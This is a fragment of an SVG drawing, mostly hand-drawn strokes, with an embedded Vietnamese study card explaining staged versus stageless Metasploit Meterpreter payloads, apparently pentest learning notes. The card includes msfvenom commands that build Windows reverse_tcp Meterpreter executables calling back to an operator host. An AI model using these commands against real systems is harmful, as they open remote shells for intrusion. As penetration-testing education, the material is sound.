<path d="M900.04 3283.62 L899.64 3284.31 L898.57 3286.98 L898.01 3288.96 L897.45 3291.13 L896.98 3293.41 L896.78 3294.59 L896.38 3296.87 L896.06 3299.14 L895.78 3301.37 L895.55 3303.39 L895.39 3305.22 L895.27 3306.01 L895.11 3307.15 L894.95 3307.99 L894.31 3307.40 L894.39 3304.98 L894.91 3301.61 L895.63 3297.56 L896.70 3293.80 L897.73 3290.79 L898.73 3288.31 L899.76 3286.29 L900.59 3284.71 L901.35 3283.57 L901.95 3282.93 L902.62 3282.68 L903.06 3283.17 L903.34 3284.01 L903.38 3285.00 L902.82 3287.08 L901.95 3288.66 L900.87 3290.09 L899.04 3291.63 L898.09 3291.87 L897.29 3291.53 L896.66 3289.80 L896.66 3289.80" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M905.17 3264.49 L904.45 3265.57 L903.81 3266.91 L902.62 3269.68 L901.59 3273.14 L901.59 3273.14" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M912.76 3288.71 L912.64 3287.72 L912.48 3286.93 L912.20 3286.34 L911.68 3285.79 L910.77 3285.79 L909.97 3286.44 L908.94 3287.72 L908.50 3288.41 L907.79 3290.09 L907.23 3291.83 L906.95 3293.51 L906.95 3294.79 L907.11 3295.83 L907.43 3296.52 L907.95 3296.97 L908.82 3296.87 L909.58 3296.47 L910.33 3295.88 L910.33 3295.88" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M919.28 3269.13 L919.28 3267.99 L919.00 3267.35 L918.40 3267.80 L917.65 3269.23 L916.89 3271.16 L916.10 3273.78 L915.42 3276.79 L914.82 3279.81 L914.31 3282.98 L913.91 3286.09 L913.59 3289.11 L913.43 3291.68 L913.31 3293.95 L913.31 3294.84 L913.39 3296.23 L913.63 3297.11 L914.23 3297.56 L914.23 3297.56" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M920.39 3284.36 L920.47 3283.52 L919.91 3283.82 L919.04 3285.89 L918.56 3287.47 L918.36 3288.31 L918.12 3289.65 L918.08 3290.84 L918.12 3291.78 L918.36 3292.47 L918.76 3293.21 L919.44 3293.36 L920.15 3293.06 L921.86 3291.58 L922.85 3290.44 L923.25 3289.85 L923.85 3288.91 L924.28 3288.22 L924.72 3287.62 L924.64 3288.46 L924.60 3289.30 L924.76 3290.14 L925.08 3290.84 L925.08 3290.84" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M931.96 3286.49 L932.12 3285.74 L931.32 3285.69 L930.37 3286.29 L928.98 3287.18 L927.66 3288.31 L926.51 3289.45 L925.76 3290.54 L925.52 3291.33 L925.76 3291.92 L926.63 3291.87 L927.54 3291.33 L928.70 3290.34 L929.77 3289.01 L930.65 3287.72 L931.24 3286.44 L931.64 3285.50 L931.96 3284.75 L932.27 3284.11 L932.27 3285.30 L932.51 3286.93 L932.67 3287.77 L932.99 3289.50 L933.35 3291.23 L933.63 3292.96 L933.83 3294.54 L933.90 3296.03 L933.90 3297.36 L933.79 3298.89 L933.51 3300.77 L932.99 3302.50 L932.24 3304.09 L931.16 3305.47 L929.69 3306.66 L927.98 3307.30 L926.31 3307.45 L924.64 3306.95 L924.64 3306.95" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M920.27 3303.05 L920.91 3303.24 L920.91 3303.24" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M963.88 3275.71 L962.92 3277.19 L962.48 3279.22 L962.17 3281.44 L961.85 3283.77 L961.69 3285.00 L961.45 3287.38 L961.29 3289.75 L961.05 3291.92 L960.78 3293.85 L960.46 3295.39 L960.46 3295.39" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M953.34 3292.52 L953.46 3291.33 L953.98 3290.69 L954.61 3290.44 L956.60 3289.94 L958.35 3289.65 L960.30 3289.35 L961.25 3289.11 L963.28 3288.51 L965.27 3287.82 L967.33 3286.68 L969.16 3285.35 L970.59 3283.87 L971.63 3282.28 L972.22 3280.35 L972.42 3278.28 L972.38 3276.35 L972.10 3274.77 L971.71 3273.68 L971.31 3273.04 L970.71 3272.79 L969.00 3273.98 L967.81 3275.71 L967.29 3276.79 L966.34 3279.27 L965.55 3282.04 L964.95 3284.75 L964.35 3288.66 L964.07 3290.94 L964.04 3293.01 L964.00 3293.85 L964.04 3295.29 L964.19 3296.23 L964.47 3296.87 L964.95 3297.31 L966.06 3296.27 L966.98 3294.10 L967.25 3293.31 L967.61 3292.17 L967.89 3291.28 L968.09 3290.49 L967.89 3291.13 L967.77 3292.07 L967.73 3292.86 L967.65 3293.85 L967.77 3294.69 L968.13 3295.14 L968.69 3294.84 L969.16 3294.30 L969.52 3293.65 L969.92 3293.11 L969.92 3294.15 L970.12 3294.79 L970.55 3295.39 L971.31 3295.34 L971.79 3294.99 L972.22 3294.44 L972.58 3293.95 L972.90 3294.54 L973.38 3295.04 L973.38 3295.04" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M980.01 3294.39 L979.46 3293.90 L978.74 3294.15 L978.19 3294.54 L977.87 3295.14 L977.75 3295.98 L978.38 3297.46 L979.38 3298.50 L979.86 3298.84 L980.81 3299.29 L981.76 3299.44 L981.76 3299.44" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M971.83 3286.59 L972.30 3287.03 L972.70 3287.57 L972.90 3288.31 L972.38 3291.87 L972.38 3291.87" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M960.89 3312.14 L960.89 3312.14" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M608.35 3312.99 L608.47 3313.83 L608.67 3316.39 L608.91 3318.77 L609.15 3321.29 L609.46 3323.71 L609.78 3326.09 L610.02 3327.22 L610.34 3329.25 L610.66 3331.13 L610.86 3332.41 L611.01 3333.45 L611.01 3333.45" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M606.32 3323.96 L606.44 3325.10 L607.24 3326.38 L608.19 3327.82 L609.42 3329.20 L610.70 3330.39 L612.05 3331.48 L613.32 3332.32 L613.96 3332.61 L615.51 3333.15 L616.26 3333.11 L616.86 3332.86 L617.29 3332.32 L617.53 3331.67 L617.69 3330.88 L617.69 3329.74 L617.53 3328.80 L617.22 3328.06 L616.74 3327.72 L615.98 3327.96 L615.39 3328.71 L614.75 3329.74 L614.35 3330.73 L614.19 3331.72 L614.19 3332.61 L614.75 3334.14 L615.51 3335.43 L616.46 3336.42 L617.33 3337.06 L618.13 3337.51 L618.88 3337.60 L619.80 3337.31 L619.80 3337.31" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M615.74 3319.07 L615.31 3318.67 L615.67 3317.93 L616.54 3317.78 L618.57 3318.67 L619.16 3319.16 L620.28 3320.20 L621.27 3321.34 L621.27 3321.34" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M635.50 3309.48 L635.02 3309.82 L633.79 3311.60 L632.88 3314.02 L631.92 3318.28 L631.60 3319.81 L631.60 3319.81" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M638.92 3329.20 L638.44 3329.64 L638.28 3330.54 L638.12 3331.52 L638.04 3332.56 L638.04 3333.55 L638.16 3334.39 L638.60 3334.98 L639.24 3334.69 L640.75 3332.46 L641.46 3331.23 L642.14 3330.34 L642.62 3329.64 L643.13 3329.10 L643.73 3329.55 L643.93 3330.44 L644.05 3331.77 L644.17 3332.56 L644.40 3335.23 L644.56 3336.62 L644.80 3337.80 L645.00 3338.64 L645.00 3338.64" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M656.81 3324.01 L656.53 3324.95 L656.33 3325.79 L655.85 3327.67 L655.38 3329.74 L654.94 3331.87 L654.34 3334.98 L654.02 3336.91 L653.94 3337.65 L653.79 3338.94 L653.67 3339.78 L653.67 3339.78" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M654.10 3335.03 L654.18 3333.99 L654.34 3333.15 L654.90 3332.76 L655.81 3332.86 L656.77 3332.91 L656.77 3332.91" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M664.72 3327.62 L664.56 3328.66 L664.40 3329.50 L664.28 3330.39 L664.04 3332.27 L663.88 3334.29 L663.72 3336.07 L663.72 3337.55 L663.76 3338.74 L663.80 3339.63 L663.96 3340.62 L664.76 3340.47 L665.51 3339.24 L666.27 3337.60 L666.98 3336.07 L667.30 3335.43 L667.62 3334.84 L668.02 3333.85 L668.37 3333.20 L668.61 3332.61 L669.09 3333.15 L669.49 3333.90 L670.08 3334.74 L670.76 3335.88 L671.12 3336.47 L671.12 3336.47" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M692.34 3332.46 L691.39 3331.43 L690.79 3330.54 L690.44 3328.90 L690.67 3328.01 L690.99 3327.47 L691.59 3326.93 L692.34 3326.78 L693.10 3327.08 L693.54 3327.52 L693.77 3328.31 L693.42 3330.68 L693.14 3331.52 L692.38 3333.20 L691.67 3334.74 L690.83 3336.17 L690.20 3337.46 L689.80 3338.25 L689.80 3338.25" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M689.80 3346.55 L689.28 3347.05 L689.28 3347.05" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M702.16 3331.08 L702.40 3330.04 L702.72 3329.45 L703.51 3328.80 L704.03 3328.51 L705.02 3328.11 L705.86 3328.11 L706.61 3328.36 L707.13 3328.80 L707.45 3329.69 L707.25 3331.38 L706.61 3333.25 L705.34 3336.17 L704.47 3337.90 L703.71 3339.53 L703.39 3340.23 L703.00 3341.31 L703.00 3341.31" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M701.84 3347.74 L701.84 3347.74" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<text x="180.72" y="3412.35" font-family="'DFVN-excalidraw', 'DFVN Excalifont', Virgil, cursive" font-size="16" fill="#c2255c" text-anchor="start"><tspan x="180.72" dy="0">III) Staged vs stageless payload</tspan></text>
</g>
<g transform="translate(-56.74,-107.24)">

<rect x="238.86195313664916" y="3448.374628212662" width="759.8226856516932" height="1276.3097517212618" rx="8" fill="#ffffff" stroke="#e0e0e0" stroke-width="1.5" class="excalidraw-md-bg"/>
<foreignObject x="238.86195313664916" y="3448.374628212662" width="759.8226856516932" height="1276.3097517212618" class="excalidraw-foreign-md">
  <div xmlns="http://www.w3.org/1999/xhtml" class="notion-embed-card">
    <div class="notion-embed-header">
      <div class="notion-embed-header-left">
        <span class="notion-embed-icon">📝</span>
        <span class="notion-embed-title">📘 Cơ chế:</span>
      </div>
      <a href="#doc-372cf8eb14c0d0e9596d0d99fd636fe2e63f0130" class="notion-embed-jump" title="Cuộn xuống đọc chi tiết toàn bộ nội dung">↓ Đọc bài viết</a>
    </div>
    <div class="notion-embed-body">
      <p>Ok mày, tao giải thích ngắn gọn về <strong>staged vs stageless</strong> payload nhé.</p>
<h3>📘 Cơ chế:</h3>
<ul>
<li><p><strong>Stageless (inline)</strong>:  </p>
<ul>
<li>Toàn bộ payload (Meterpreter/shell) nằm trong một file.  </li>
<li>Khi chạy, nó kết nối thẳng về máy mày → xong.  </li>
<li><strong>Ưu</strong>: đáng tin cậy, không cần tải thêm.  </li>
<li><strong>Nhược</strong>: file to hơn.</li>
</ul>
</li>
<li><p><strong>Staged</strong>:  </p>
<ul>
<li>Gồm 2 phần: <strong>stager</strong> (nhỏ) và <strong>stage</strong> (to).  </li>
<li>Stager chạy trước, kết nối về handler, sau đó <strong>tải stage</strong> từ handler về rồi mới thực thi.  </li>
<li><strong>Ưu</strong>: file nhỏ, dễ chui qua nơi giới hạn kích thước.  </li>
<li><strong>Nhược</strong>: cần handler luôn bật để serve stage, nếu rớt mạng giữa chừng là fail.</li>
</ul>
</li>
</ul>
<h3>🔎 Phân biệt qua tên:</h3>
<ul>
<li><code>/</code> = <strong>staged</strong> → <code>windows/x64/meterpreter/reverse_tcp</code>  </li>
<li><code>_</code> = <strong>stageless</strong> → <code>windows/x64/meterpreter_reverse_tcp</code></li>
</ul>
<h3>🎯 Khi nào chọn loại nào:</h3>
<ul>
<li><strong>Stageless</strong>: khi tạo file standalone bằng msfvenom (đem đi USB, upload, SSH...). Vì cần tự chứa hết, không phụ thuộc mạng.</li>
<li><strong>Staged</strong>: khi dùng msfconsole exploit vì module tự lo staging; hoặc khi cần file nhỏ (buffer overflow, SQLi giới hạn shellcode).</li>
</ul>
<h3>🧪 Tạo bằng msfvenom:</h3>
<p><strong>Staged:</strong></p>
<pre><code class="language-bash">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o staged.exe
</code></pre>
<p><strong>Stageless:</strong></p>
<pre><code class="language-bash">msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=IP LPORT=4444 -f exe -o stageless.exe
</code></pre>
<p>So sánh kích thước: staged ~7 KB (stager nhỏ), stageless ~250 KB (đầy đủ).</p>
<h3>📌 Handler behavior:</h3>
<ul>
<li>Với <strong>staged</strong>, handler phải bật sẵn để khi stager gọi về, nó serve stage ngay. Nếu không khớp payload type hay không mở port đúng, connection fail.</li>
<li>Với <strong>stageless</strong>, handler chỉ cần nhận kết nối, không cần serve gì thêm.</li>
</ul>
<p>➡️ <strong>Tóm gọn:</strong>  </p>
<ul>
<li><strong>Stageless</strong> = &quot;một cục&quot; → tự chạy, đáng tin, dùng cho file thủ công.  </li>
<li><strong>Staged</strong> = &quot;hai phần&quot; → nhỏ nhẹ, cần handler hỗ trợ tải, thường do exploit tự lo.</li>
</ul>
<p>Hỏi tiếp đi! 😎</p>

    </div>
  </div>
</foreignObject>

</g>
<g transform="translate(-56.74,-107.24)">
<path d="M796.08 3623.57 L795.12 3623.95 L794.34 3624.32 L795.24 3624.82 L797.03 3624.89 L800.06 3624.89 L803.77 3624.76 L807.98 3624.45 L812.30 3624.07 L818.48 3623.51 L820.22 3623.45 L823.53 3623.13 L826.45 3622.95 L829.03 3622.70 L830.10 3622.63 L831.67 3622.57 L832.85 3622.45 L832.85 3622.45" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M835.60 3613.19 L834.81 3612.69 L835.54 3613.13 L836.05 3613.82 L836.50 3614.44 L836.95 3615.32 L837.23 3616.19 L837.34 3617.26 L836.72 3619.76 L835.66 3621.95 L834.98 3623.07 L833.07 3625.57 L831.05 3627.95 L831.05 3627.95" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M864.85 3595.75 L864.29 3596.50 L864.06 3597.44 L863.67 3599.81 L863.22 3602.56 L862.77 3605.44 L862.38 3608.44 L861.99 3611.50 L861.76 3614.44 L861.65 3617.26 L861.54 3619.88 L861.48 3621.19 L861.48 3623.13 L861.43 3624.76 L861.43 3626.01 L861.31 3627.45 L861.31 3628.57 L861.26 3629.76 L861.26 3630.89 L861.31 3631.95 L861.93 3632.64 L864.74 3632.83 L867.83 3632.83 L871.76 3632.83 L876.36 3633.01 L881.24 3633.32 L886.52 3633.83 L894.83 3635.20 L900.33 3636.45 L903.03 3637.08 L908.81 3638.45 L914.81 3639.83 L921.78 3641.39 L928.96 3642.83 L935.64 3644.02 L941.99 3645.08 L948.16 3646.02 L954.06 3646.77 L956.81 3647.15 L963.54 3647.90 L967.59 3648.27 L970.84 3648.58 L973.71 3648.71 L976.23 3648.90 L978.20 3648.96 L979.66 3648.96 L980.78 3648.77 L981.85 3648.33 L981.85 3648.33" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M876.70 3584.24 L879.33 3584.37 L884.44 3584.93 L888.93 3585.37 L894.44 3586.12 L897.41 3586.49 L903.59 3587.37 L910.44 3588.56 L917.68 3589.75 L924.19 3591.12 L929.92 3592.43 L935.25 3593.87 L940.19 3595.31 L946.20 3597.12 L948.05 3597.75 L951.42 3598.87 L954.28 3599.81 L956.81 3600.75 L959.22 3601.62 L961.41 3602.56 L963.49 3603.37 L965.17 3604.12 L966.35 3604.69 L967.42 3605.19 L968.93 3606.25 L969.55 3606.88 L970.00 3607.50 L970.84 3609.25 L971.35 3611.32 L971.63 3613.63 L971.63 3616.25 L971.40 3619.19 L971.29 3620.88 L970.56 3624.57 L969.78 3628.32 L968.93 3632.20 L967.59 3637.77 L966.91 3641.08 L966.13 3644.21 L965.62 3646.83 L965.06 3649.33 L964.84 3650.46 L964.61 3651.46 L964.33 3653.02 L964.05 3654.21 L963.83 3655.21 L963.49 3656.33 L963.10 3657.33 L963.10 3657.33" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M838.63 3855.11 L837.62 3854.92 L840.60 3854.17 L843.46 3853.80 L846.60 3853.42 L848.29 3853.17 L851.71 3852.98 L855.19 3852.73 L858.51 3852.67 L861.76 3852.61 L866.48 3852.67 L869.45 3852.67 L872.32 3852.67 L874.73 3852.61 L876.47 3852.61 L877.76 3852.55 L877.76 3852.55" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M879.95 3843.67 L880.18 3842.79 L881.47 3842.85 L882.70 3843.98 L883.66 3845.42 L884.44 3847.30 L884.72 3848.30 L884.95 3850.17 L884.78 3852.30 L884.05 3854.80 L882.53 3857.80 L880.51 3860.74 L878.16 3863.43 L876.02 3865.93 L876.02 3865.93" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M913.86 3847.23 L912.96 3849.98 L912.34 3852.98 L911.67 3856.68 L910.89 3860.68 L910.55 3862.68 L909.76 3866.68 L909.03 3870.74 L908.41 3874.68 L907.80 3878.37 L906.96 3883.06 L906.62 3885.37 L906.62 3885.37" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M917.23 3849.11 L917.57 3847.79 L918.80 3846.04 L920.54 3844.92 L922.73 3844.04 L926.66 3843.79 L929.52 3843.98 L930.87 3844.29 L933.68 3845.04 L936.32 3846.11 L938.62 3847.42 L940.64 3848.92 L942.38 3850.42 L943.78 3852.05 L945.07 3853.73 L945.97 3855.49 L946.59 3857.30 L946.81 3858.17 L947.10 3861.05 L947.10 3863.55 L946.87 3866.24 L946.42 3869.12 L945.86 3872.05 L945.07 3874.99 L944.23 3878.06 L943.45 3881.18 L942.89 3882.56 L942.04 3885.31 L941.14 3888.00 L939.97 3891.44 L939.18 3893.31 L938.62 3894.69 L938.62 3894.69" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M918.01 3885.94 L917.17 3885.50 L916.16 3884.93 L916.50 3884.06 L919.59 3883.25 L922.17 3882.75 L923.52 3882.69 L926.44 3882.62 L929.64 3882.62 L931.21 3882.62 L931.21 3882.62" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M928.18 3887.44 L927.67 3888.06 L927.67 3888.06" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M984.54 3864.24 L983.47 3864.37 L985.21 3864.37 L987.85 3864.05 L990.89 3863.74 L993.97 3863.36 L997.17 3863.05 L1000.32 3862.80 L1004.75 3862.43 L1007.61 3862.18 L1008.91 3862.11 L1010.03 3862.05 L1011.77 3861.86 L1013.06 3861.86 L1014.41 3861.74 L1014.41 3861.74" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M867.38 3547.85 L866.14 3547.85 L865.24 3548.10 L864.51 3551.42 L864.12 3553.29 L863.22 3558.23 L861.87 3564.67 L859.29 3576.36 L857.10 3586.37 L855.53 3594.25 L854.18 3602.12 L853.00 3609.63 L852.67 3612.94 L852.05 3619.63 L851.66 3626.01 L851.26 3632.08 L851.15 3637.58 L850.93 3642.52 L850.76 3649.52 L850.53 3653.83 L850.48 3655.90 L850.25 3659.34 L850.09 3662.59 L849.92 3665.40 L849.86 3667.90 L849.80 3669.03 L849.69 3670.72 L849.58 3672.16 L849.47 3673.47 L849.30 3674.66 L849.19 3675.72 L849.02 3676.78 L848.79 3678.16 L848.63 3679.28 L848.51 3680.22 L848.34 3681.35 L848.40 3682.41 L850.98 3683.04 L854.01 3682.97 L857.83 3682.66 L863.00 3682.16 L869.34 3681.47 L872.71 3681.16 L880.57 3680.47 L887.98 3680.03 L895.05 3679.66 L902.80 3679.41 L910.83 3679.41 L919.14 3679.72 L931.38 3680.60 L939.35 3681.53 L943.33 3681.97 L951.14 3682.97 L958.72 3683.91 L965.68 3684.79 L971.85 3685.48 L977.97 3686.04 L983.81 3686.41 L988.86 3686.66 L993.97 3686.60 L998.80 3686.35 L1003.18 3685.97 L1007.50 3685.53 L1011.26 3684.85 L1014.41 3684.16 L1017.05 3683.35 L1019.35 3682.29 L1021.20 3680.97 L1022.89 3679.35 L1024.34 3677.47 L1025.02 3676.22 L1026.42 3673.41 L1027.71 3670.22 L1029.51 3665.22 L1030.58 3661.71 L1031.47 3658.15 L1032.15 3654.58 L1032.71 3650.77 L1032.93 3646.77 L1032.99 3644.71 L1033.05 3640.14 L1032.99 3635.20 L1032.99 3630.08 L1032.93 3624.82 L1032.82 3617.44 L1032.60 3613.07 L1032.32 3609.06 L1031.70 3605.50 L1031.25 3603.81 L1030.30 3600.75 L1028.84 3597.87 L1027.04 3595.00 L1024.91 3592.43 L1022.44 3590.06 L1019.63 3587.74 L1016.60 3585.74 L1011.54 3582.93 L1009.80 3582.12 L1006.16 3580.62 L1002.34 3579.24 L998.52 3578.05 L994.76 3576.92 L990.89 3575.99 L986.96 3575.05 L983.03 3574.30 L978.98 3573.49 L974.83 3572.86 L972.70 3572.55 L965.85 3571.86 L961.07 3571.42 L956.30 3571.05 L951.59 3570.49 L946.87 3569.92 L942.38 3569.24 L938.06 3568.49 L933.79 3567.73 L931.66 3567.36 L927.50 3566.48 L923.29 3565.73 L919.14 3564.98 L913.24 3563.92 L909.54 3563.42 L906.39 3562.86 L903.53 3562.42 L900.89 3562.04 L899.60 3561.79 L897.24 3561.55 L895.00 3561.29 L893.14 3560.98 L891.07 3560.79 L889.33 3560.55 L887.76 3560.42 L885.17 3560.11 L882.98 3559.86 L881.24 3559.61 L879.67 3559.42 L878.32 3559.23 L877.09 3559.04 L876.13 3558.79 L874.96 3558.48 L874.96 3558.48" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M894.16 3597.50 L893.26 3599.93 L892.86 3601.06 L892.13 3603.44 L891.29 3606.00 L890.51 3608.69 L889.83 3611.32 L889.16 3613.69 L888.54 3615.88 L888.26 3616.76 L887.87 3618.19 L887.64 3619.13 L887.36 3620.26 L887.64 3617.13 L888.04 3614.19 L888.54 3611.32 L889.27 3608.44 L890.06 3605.88 L890.62 3604.69 L891.74 3602.56 L892.92 3600.75 L894.32 3599.25 L894.89 3598.56 L896.12 3597.75 L897.19 3597.18 L898.48 3597.06 L899.49 3597.44 L900.39 3598.12 L901.00 3598.93 L901.40 3599.81 L901.57 3600.88 L901.40 3601.94 L900.33 3604.00 L899.26 3605.06 L898.20 3605.75 L897.19 3606.13 L897.19 3606.13" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M906.90 3608.13 L906.17 3608.50 L905.50 3608.94 L904.77 3609.63 L904.20 3610.50 L903.64 3611.38 L903.31 3612.19 L902.97 3613.19 L903.36 3613.94 L904.09 3613.57 L904.93 3613.07 L905.72 3612.57 L905.83 3613.69 L905.78 3614.76 L906.06 3615.69 L906.73 3616.44 L907.63 3616.88 L907.63 3616.88" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M915.60 3615.13 L915.71 3616.13 L916.33 3616.76 L917.34 3616.51 L918.07 3616.01 L918.80 3615.38 L919.53 3614.76 L920.26 3614.19 L920.93 3614.69 L920.77 3615.88 L920.77 3617.13 L920.71 3618.57 L920.71 3620.38 L920.65 3621.38 L920.54 3623.13 L920.49 3624.51 L920.32 3625.63 L920.20 3626.95 L919.98 3627.95 L918.97 3627.57 L918.52 3626.70 L918.52 3626.70" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M931.26 3606.13 L930.98 3607.13 L930.59 3608.82 L930.09 3611.01 L929.52 3613.25 L929.07 3615.63 L928.63 3617.95 L928.40 3619.13 L928.01 3621.38 L927.90 3623.32 L927.78 3624.76 L927.78 3625.95 L928.01 3627.13 L928.57 3627.76 L929.75 3627.51 L931.43 3626.07 L932.61 3624.63 L933.79 3623.38 L934.58 3622.38 L935.19 3621.63 L935.76 3620.88 L935.36 3621.88 L935.25 3622.95 L935.42 3623.89 L935.76 3624.89 L936.26 3625.63 L936.88 3626.13 L937.10 3625.13 L936.93 3624.07 L936.88 3623.01 L936.77 3621.70 L937.21 3620.76 L938.00 3620.19 L938.96 3620.07 L940.25 3620.07 L941.09 3620.38 L941.71 3620.95 L941.76 3622.19 L941.59 3623.13 L941.31 3624.20 L941.09 3625.26 L940.86 3626.38 L941.14 3627.20 L941.93 3626.82 L942.49 3626.32 L943.11 3625.76 L943.78 3625.20 L944.46 3624.76 L944.40 3625.95 L944.23 3626.95 L944.23 3626.95" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M950.80 3625.51 L949.68 3625.57 L949.06 3626.26 L948.61 3626.95 L948.33 3627.82 L948.56 3628.82 L949.45 3629.01 L949.45 3629.01" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M956.30 3617.19 L956.53 3616.25 L956.25 3617.44 L956.02 3618.38 L955.85 3619.63 L955.74 3620.82 L955.63 3622.01 L955.63 3622.01" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M922.28 3532.09 L921.94 3534.84 L921.66 3537.47 L921.55 3539.97 L921.44 3541.22 L921.38 3543.22 L921.33 3544.91 L921.21 3546.29 L921.16 3547.48 L921.10 3548.79 L921.10 3548.79" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M922.00 3519.46 L924.64 3518.65 L925.99 3518.46 L928.63 3518.15 L931.21 3518.15 L934.58 3518.78 L935.59 3519.09 L937.38 3519.96 L937.38 3519.96" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
